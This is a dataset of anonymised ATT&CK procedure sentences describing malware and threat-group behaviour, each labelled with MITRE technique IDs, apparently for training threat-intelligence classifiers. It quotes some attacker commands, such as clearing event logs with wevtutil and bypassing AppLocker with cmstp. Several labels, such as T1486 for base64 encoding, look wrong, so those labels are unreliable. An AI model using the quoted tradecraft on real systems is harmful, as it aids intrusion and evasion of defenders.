text1	labels
A  variant can use port 127 for communications.	['T1571']
A  variant registers as a Winlogon Event Notify DLL to establish persistence.	['T1547.004']
"A  variant takes screenshots by simulating the user pressing the ""Take Screenshot"" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image."	['T1113']
A  variant uses a custom packer.	['T1027.002']
A version of  introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.	['T1027']
A version of  uses the MPRESS packer.	['T1027.002']
backdoor RoyalDNS established persistence through adding a service called Nwsapagent.	['T1543.003']
base64 encodes strings that are sent to the C2 over its DNS tunnel.	['T1001']
binds to a raw socket on a random source port between 31800 and 31900 for C2.	['T1095']
can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.	['T1029']
can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).	['T1005']
can be used to automate exploitation of SQL injection vulnerabilities.	['T1190']
can be used to discover routing configuration information.	['T1016']
can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.	['T1016']
can be used to gather information on user accounts within a domain.	['T1087']
can bypass UAC and create an elevated COM object to escalate privileges.	['T1548.002']
can capture screenshots of the desktop over multiple monitors.	['T1113']
can collect system information.	['T1082']
can communicate using HTTP or HTTPS.	['T1071']
can compress data before sending it.	['T1560']
can create a link to itself in the Startup folder to automatically start itself upon system restart.	['T1547.001']
can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.	['T1059']
can decrypt, unpack and load a DLL from its resources.	['T1140']
can download additional components from the C2 server.	['T1105']
"can download a hosted ""beacon"" payload using ."	['T1197']
can download and execute a file from given URL.	['T1105']
can download files.	['T1105']
can download files and upgrade itself.	['T1105']
can dump process memory and extract clear-text credentials.	['T1003']
can enumerate files and directories.	['T1083']
can enumerate registry keys.	['T1012']
can enumerate services.	['T1007']
can execute shell commands.	['T1059']
can gather information about the victim proxy server.	['T1016']
can gather the username from the victim’s machine.	['T1033']
can gather the victim computer name.	['T1082']
can inject content into lsass.exe to load a module.	['T1055']
can install as a Windows service for persistence.	['T1543.003']
can list directory contents.	['T1083']
can obtain a list of running processes on the system.	['T1057']
can obtain a list of users.	['T1087']
can obtain information about network parameters.	['T1016']
can obtain the victim time zone.	['T1124']
can perform audio capture.	['T1123']
can perform credential dumping.	['T1003']
can perform port scans from an infected host.	['T1046']
can perform webcam viewing.	['T1125']
can remove itself from a system.	['T1070.004']
can retrieve an additional payload from its C2 server.	['T1105']
can search files on a victim.	['T1083']
can sleep for a given number of seconds.	['T1029']
can SSH to a remote service.	['T1021']
can start, stop, or delete services.	['T1569.002']
can upload and download files, including second-stage malware.	['T1105']
can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.	['T1064']
can use a WMI script to achieve persistence.	['T1546.003']
can use base64 encoded C2 communications.	['T1132']
can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.  also collects C2 information via a dead drop resolver.	['T1102']
can use Regsvr32 to execute additional payloads.	['T1218.010']
can use steganography to hide malicious code downloaded to the victim.	['T1001']
can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.	['T1569.002']
can use WMI to deliver a payload to a remote host.	['T1047']
captured audio and sent it out to a C2 server.	['T1123']
captures images from the webcam.	['T1125']
checks for anti-malware products and processes.	['T1518.001']
checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.	['T1518.001']
checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.	['T1518.001']
checks its directory location in an attempt to avoid launching in a sandbox.	['T1083']
checks the running processes on the victim’s machine.	['T1057']
collects a list of available servers with the command net view.	['T1018']
collects a list of running services with the command tasklist /v.	['T1057']
collects files from the local system.	['T1005']
collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.	['T1082']
collects information about the Internet adapter configuration.	['T1016']
collects information on bookmarks from Google Chrome.	['T1217']
collects information on local user accounts from the victim.	['T1087']
collects information on programs and services on the victim that are configured to automatically run at startup.	['T1007']
collects lists of local accounts with administrative access, local group user accounts, and domain local groups with the commands net localgroup administrators, net localgroup users, and net localgroup /domain.	['T1069']
collects registered owner details by using the commands systeminfo and net config workstation.	['T1033']
collects system information, including the operating system version and hostname.	['T1082']
collects the username from the victim.	['T1033']
collects the victim host name and serial number, and then sends the information to the C2 server.	['T1082']
collects the victim username along with other account information (account type, description, full name, SID and status).	['T1033']
collects the victim username and sends it to the C2 server.	['T1033']
collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.	['T1003']
communicates over port 80 for C2.	['T1043']
communicates with its C2 domain over ports 443 and 8443.	['T1043']
contains a collection of ScriptModification modules that compress and encode scripts and payloads.	['T1027']
contains a command to list processes.	['T1057']
contains a feature to manipulate process privileges and tokens.	['T1134']
contains a module to collect data from removable drives.	['T1025']
contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.	['T1052']
contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.	['T1105']
creates a backdoor through which remote attackers can list contents of drives and search for files.	['T1083']
creates a backdoor through which remote attackers can monitor processes.	['T1057']
creates a backdoor through which remote attackers can open a command line interface.	['T1059']
creates a backdoor through which remote attackers can read data from files.	['T1005']
creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.	['T1082']
creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.	['T1052']
creates a scheduled task on the system that provides persistence.	['T1053.005']
CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.	['T1552.004']
decodes the configuration data and modules.	['T1140']
decrypts and executes shellcode from a file called Stars.jps.	['T1140']
deletes its payload along with the payload's parent process after it finishes copying files.	['T1070.004']
delets all artifacts associated with the malware from the infected machine.	['T1070']
deobfuscates its code.	['T1140']
developed a file stealer to search C:\ and collect files with certain extensions.  also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.	['T1119']
disables the Windows firewall before binding to a port.	['T1562.001']
downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.	['T1105']
downloads and uploads files to and from the victim’s machine.	['T1105']
downloads another dropper from its C2 server.	['T1105']
DPAPI module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.	['T1552.001']
drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.	['T1547.008']
drops and executes a malicious CPL file as its payload.	['T1218.002']
drops files with base64-encoded data.	['T1027']
enables concurrent Remote Desktop Protocol (RDP).	['T1021.001']
encodes C2 communications with base64.	['T1001']
encodes C2 traffic with single-byte XOR keys.	['T1573']
encrypts C2 data with AES256 in ECB mode.	['T1573']
encrypts data using Base64 before being sent to the command and control server.	['T1486']
enumerates all running processes.	['T1057']
enumerates Registry keys associated with event logs.	['T1012']
enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.	['T1012']
enumerates running processes to search for Wireshark and Windows Sysinternals suite.	['T1518.001']
establishes persistence by creating a shortcut in the Start Menu folder.	['T1547.001']
establishes persistence via a .lnk file in the victim’s startup path.	['T1547.009']
executes batch scripts on the victim’s machine.	['T1064']
exfiltrates data collected from the victim mobile device.	['T1005']
exfiltrates data over its C2 channel.	['T1041']
exfiltrates data to its C2 server over the same protocol as C2 communications.	['T1041']
exfiltrates files over FTP.	['T1048']
extracts basic information about the operating system.	['T1082']
"For C2 over HTTP,  encodes data with base64 and sends it via the ""Cookie"" field of HTTP requests. For C2 over DNS,  converts ASCII characters into their hexadecimal values and sends the data in cleartext."	['T1132']
Freenki malware lists running processes using the Microsoft Windows API.	['T1057']
functions as a proxy server between the victim and C2 server.	['T1090']
gathers and beacons the MAC and IP addresses during installation.	['T1016']
gathers computer name and information using the systeminfo command.	['T1082']
gathers credentials in files for chrome, 1password, and keychains.	['T1552.001']
gathers information about the OS architecture, OS name, and OS version/Service pack.	['T1082']
gathers information on the system and local drives.	['T1082']
gathers information on victim’s drives and has a plugin for document listing.	['T1083']
gathers the local IP address.	['T1016']
generates a false TLS handshake using a public certificate to disguise C2 network communications.	['T1001']
Get-MicrophoneAudio Exfiltration module can record system microphone audio.	['T1123']
Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.	['T1113']
harvests plain-text credentials as a password filter registered on domain controllers.	['T1556.002']
has a command named $screenshot that may be responsible for taking screenshots of the victim machine.	['T1113']
has a command to collect victim system information, including the system name and OS version.	['T1082']
has a command to create, set, copy, or delete a specified Registry key or value.	['T1112']
has a command to create Registry entries for storing data under HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath.	['T1112']
has a command to return a directory listing for a specified directory.	['T1083']
has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.	['T1083']
has a feature to list the available services on the system.	['T1007']
has a hard-coded primary and backup C2 string.	['T1008']
has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.	['T1011']
has a plugin for VNC and Ammyy Admin Tool.	['T1219']
has a tool that can delete files.	['T1070.004']
has a tool that can obtain information about the local system.	['T1082']
has a tool that creates a new service for persistence.	['T1543.003']
has a VBScript for execution.	['T1064']
has batch files that modify the system service COMSysApp to load a malicious DLL.	['T1543.003']
has been known to dump credentials.	['T1003']
has been known to side load DLLs with a valid version of Chrome with one of their tools.	['T1574.002']
has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.	['T1546.015']
has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.	['T1070']
has cleared event logs from victims.	['T1070']
has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.	['T1039']
has created password-protected RAR, WinImage, and zip archives to be exfiltrated.	['T1560', 'T1486']
has created scheduled tasks that run a VBScript to execute a payload on victim machines.	['T1053.005']
has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.	['T1189']
has downloaded and executed additional plugins.	['T1105']
has dropped binaries as files named microsoft_network.exe and crome.exe.	['T1036']
has encrypted its payload with RC4.	['T1027']
has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.	['T1203']
has functionality to copy itself to removable media.	['T1091']
has gathered a process list by using .exe.	['T1057']
has gathered information about network IP configurations using .exe and about routing tables using .exe.	['T1016']
has has extensively used strategic Web compromises to target victims.	['T1189']
has leveraged both Spearphishing Link and Spearphishing Attachment attempting to gain User Execution.	['T1204']
has lured users to click links to malicious HTML applications delivered via spearphishing emails.	['T1204']
has obfuscated a script with Crypto Obfuscator.	['T1027']
has run ipconfig /all on a victim.	['T1016']
has sent spearphishing emails links and attachments attempting to get a user to click.	['T1204']
has sent spearphishing emails with attachments to victims as its primary initial access vector.	['T1598.002']
has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.	['T1598.002']
has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.	['T1598.002']
has sent spearphising emails with malicious links to potential victims.	['T1598.003']
has targeted manufacturers in the supply chain for the defense industry.	['T1195']
has the ability to enumerate files and drives.	['T1083']
has the ability to obtain a victim's system name and operating system version.	['T1082']
has the ability to remotely execute commands.	['T1059']
has the ability to search for a given process name in processes currently running in the system.	['T1057']
has the capability to delete files.	['T1070.004']
has the capability to download files to execute on the victim’s machine.	['T1105']
has the capability to execute the command net localgroup administrators.	['T1069']
has the capability to gather the OS version and computer name.	['T1082']
has the capability to obtain the time zone information and current timestamp of the victim’s machine.	['T1124']
has the capability to upload and download files to the victim's machine.	['T1105']
has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.	['T1003']
has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.	['T1552.001']
has used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.	['T1573']
"has used a VBScript named ""ggldr"" that uses Google Apps Script, Sheets, and Forms services for C2."	['T1102']
has used both HTTP and HTTPS for C2.	['T1071']
has used CHM files to move concealed payloads as part of.	['T1218.001']
has used command-line interfaces for execution.	['T1059']
has used CVE-2016-7255 to escalate privileges.	['T1068']
has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .	['T1574.002']
has used FTP to exfiltrate collected data.	['T1048']
has used HTTP and HTTPS for C2 communications.	['T1071']
has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.	['T1547.009', 'T1547.001']
has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.	['T1090']
has used net user to conduct internal discovery of systems.	['T1087']
has used net use to conduct connectivity checks to machines.	['T1049']
has used PowerShell Empire.	['T1059.001']
has used RAR to compress, encrypt, and password-protect files prior to exfiltration.	['T1560', 'T1486']
has used RAR to compress files before moving them outside of the victim network.	['T1560']
has used Registry keys to detect and avoid executing in potential sandboxes.	['T1518.001']
has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.	['T1547.001']
has used remote code execution to download subsequent payloads.	['T1105']
has used rundll32.exe in a Registry value to establish persistence.	['T1218.011']
has used scheduled task raw XML with a backdated timestamp of June 2, 2016.	['T1070.006']
has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.	['T1598.003']
has used spearphishing with links to deliver files with exploits to initial victims. The group has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.	['T1598.003']
has used TCP port 8080 for C2.	['T1043']
has used the command cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.	['T1218.003']
has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.	['T1046']
has used  to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.	['T1082']
has used  to get information on processes.	['T1057']
has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.	['T1068']
has used tools to perform keylogging.	['T1056']
has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.	['T1574.002']
has used valid accounts for privilege escalation.	['T1078']
has used watering holes to deliver files with exploits to initial victims.	['T1189']
has used WMI for execution.	['T1047']
hooks processes by modifying IAT pointers to CreateWindowEx.	['T1056.004']
identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.	['T1083']
identifies files with certain extensions from USB devices, then copies them to a predefined directory.	['T1083']
If running in a Windows environment,  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.	['T1055']
If the victim is using PowerShell 3.0 or later,  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\Windows\.	['T1564.004']
injects itself into the secure shell (SSH) process.	['T1055']
"In one instance,  added  as a service with a display name of ""Corel Writing Tools Utility."""	['T1036']
installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.	['T1070.004']
installer uses WMI to search for antivirus display names.	['T1047']
installs a service on the remote system, executes the command, then uninstalls the service.	['T1569.002']
installs itself as a service for persistence.	['T1543.003']
installs itself as a service to maintain persistence.	['T1543.003']
"installs itself in %ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe; the directory name is missing a space and the file name is missing the letter ""o."""	['T1036']
installs VNC server software that executes through rundll32.	['T1218.011']
is a Web shell that appears to be exclusively used by . It is installed as an ISAPI filter on Exchange servers and shares characteristics with the  Web shell.	['T1505.003']
is capable of capturing keystrokes on victims.	['T1056']
is capable of capturing screenshots.	['T1113']
is capable of capturing video.	['T1125']
is capable of downloading a file from a specified URL.	['T1105']
is capable of enumerating Registry keys and values.	['T1012']
is capable of gathering system information.	['T1082']
is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.	['T1102']
is capable of modifying the Registry.	['T1112']
is capable of providing Meterpreter shell access.	['T1059']
is capable of spawning a reverse shell on a victim.	['T1059']
is known to use PowerShell.	['T1059.001']
is loaded and executed by a highly obfuscated launcher.	['T1027']
is used for proxying connections to obfuscate command and control infrastructure.	['T1090']
It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the  malware.	['T1072']
kills antimalware running process.	['T1562.001']
launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.	['T1574.002']
launches a DLL file that gets executed as a service using svchost.exe	['T1569.002']
leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.	['T1203']
leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.	['T1106']
lists local users and session information.	['T1033']
lists the current processes running.	['T1057']
lists the running processes on the system.	['T1057']
looked for a specific process running on infected servers.	['T1057']
malware can download a remote access tool, NanoCore, and inject into another process.	['T1055']
malware can use cmd.exe to download and execute payloads and to execute commands on the system.	['T1059']
malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.	['T1059.001']
malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.	['T1082']
malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.	['T1005']
malware is capable of keylogging.	['T1056']
Malware used by  is capable of watching the victim's screen.	['T1113']
may collect process information by running tasklist on a victim.	['T1057']
may collect user account information by running net user /domain or a series of other commands on a victim.	['T1087']
may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier}.	['T1547.001']
may query the Registry by running reg query on a victim.	['T1012']
may use net start to display running services.	['T1007']
may use netstat -ano to display active network connections.	['T1049']
MISC::AddSid module can appended any SID or user/group account to a user's SID-History.  also utilizes  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.	['T1134.005']
modified the Registry to perform multiple techniques through the use of .	['T1112']
modifies the tty_tickets line in the sudoers file.	['T1548.003']
monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.	['T1120']
obfuscates C2 traffic with an altered version of base64.	['T1001']
obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum. Another  variant gathers the victim storage volume serial number and the storage device name.	['T1082']
obtains the target's IP address and local network segment.	['T1016']
One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ <br>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ <br>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run <br>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run	['T1547.001']
One  variant connected to its C2 server over port 8080.	['T1043']
"One  variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value ""0x35""."	['T1140']
One variant of  locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.	['T1574.010']
packed an executable by base64 encoding the PE file and breaking it up into numerous lines.	['T1027.002']
performs a connection test to discover remote systems in the network	['T1018']
performs code injection injecting its own functions to browser processes.	['T1055']
performs local network configuration discovery using ipconfig.	['T1016']
performs XOR encryption.	['T1573']
persists by creating a Registry entry in HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\.	['T1547.001']
persists through a scheduled task that executes it every minute.	['T1053.005']
places scripts in the startup folder for persistence.	['T1547.001']
presents an input prompt asking for the user's login and password.	['T1056']
prompts the user for credentials.	['T1056']
prompts the users for credentials.	['T1056']
provides command-line access to the compromised system.	['T1059']
queried the Registry to identify victim information.	['T1012']
regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.	['T1133']
regularly deploys both publicly available and custom password retrieval tools on victims.	['T1003']
removed certain files and replaced them so they could not be retrieved.	['T1070.004']
Responses from the  C2 server are base32-encoded.	['T1132']
runs the command net start on a victim.	['T1007']
saves information from its keylogging routine as a .zip file in the present working directory.	['T1074']
"saves itself with a leading ""."" to make it a hidden file."	['T1564.001']
saves one of its files as mpr.dll in the Windows folder, masquerading as a legitimate library file.	['T1036']
scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.	['T1083']
scans to identify open ports on the victim.	['T1046']
scrapes memory for properly formatted payment card data.	['T1005']
searches and reads the value of the Windows Update Registry Run key.	['T1012']
searches for files on the victim's machine.	['T1083']
searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.  also collects information stored in the Windows Address Book.	['T1005']
searches through connected drives for removable storage devices.	['T1120']
searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.	['T1083']
selective infector modifies executables stored on removable media as a method of spreading across computers.	['T1091']
sends collected files back over same C2 channel.	['T1041']
sent emails to victims with malicious Microsoft Office documents attached.	['T1598.002']
sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.	['T1598.002']
Several commands are supported by the 's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.	['T1059']
Several  malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by  also gathers process times.	['T1057']
Some  samples encrypt C2 communications with RC4.	['T1573']
Some  strings are base64 encoded, such as the embedded DLL known as MockDll.	['T1027']
Some  variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.	['T1036']
Some  variants establish persistence by modifying the Registry key HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe.	['T1547.001']
Some  variants incorporate an MBR rootkit.	['T1542.003']
Some  variants use port 8088 for C2.	['T1571']
stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.	['T1553.002']
"stages data it copies from the local system or removable drives in the ""%WINDIR%\$NtUninstallKB885884$\"" directory."	['T1074']
steals credentials stored inside Internet Explorer.	['T1003']
steals user files from removable media with file extensions and keywords that match a predefined list.	['T1025']
stole domain credentials from Microsoft Active Directory Domain Controller and leveraged .	['T1003']
stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.	['T1564.004']
strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.	['T1027']
supports peer connections.	['T1090']
surveys a system upon check-in to discover running processes using the tasklist /v command.	['T1057']
takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.	['T1113']
takes periodic screenshots and exfiltrates them.	['T1113']
takes screenshots of the user's desktop.	['T1113']
terminates antimalware processes.	['T1562.001']
tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.	['T1008']
The  backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.	['T1505.003']
The C2 server used by  provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.	['T1008']
The  credential dumper contains an implementation of an SSP.	['T1547.005']
The  credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value.	['T1098']
The executable version of  has a module to log clipboard contents.	['T1115']
The  group is known to have used RDP during operations.	['T1021.001']
The  malware platform uses Extended Attributes to store encrypted executables.	['T1564.004']
The  malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.	['T1001']
the victim's internal network for hosts with ports 8080, 5900, and 40 open.	['T1046']
To move laterally on a victim network,  has used credentials stolen from various systems on which it gathered usernames and password hashes.	['T1078']
Tools used by  are capable of downloading and executing additional payloads.	['T1105']
TRINITY malware used by  encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.	['T1486']
uploads files from a specified directory to the C2 server.	['T1005']
used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.	['T1016']
used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable .	['T1221']
used a proxy server between victims and the C2 server.	['T1090']
used a signed credential-dumping tool to obtain victim account credentials.	['T1003']
used a tool called MailSniper to search through the Exchange server mailboxes for keywords.	['T1114']
used a valid AppleDeveloperID to sign the code to get past security restrictions.	['T1553.002']
used batch scripts to enumerate administrators in the environment.	['T1069']
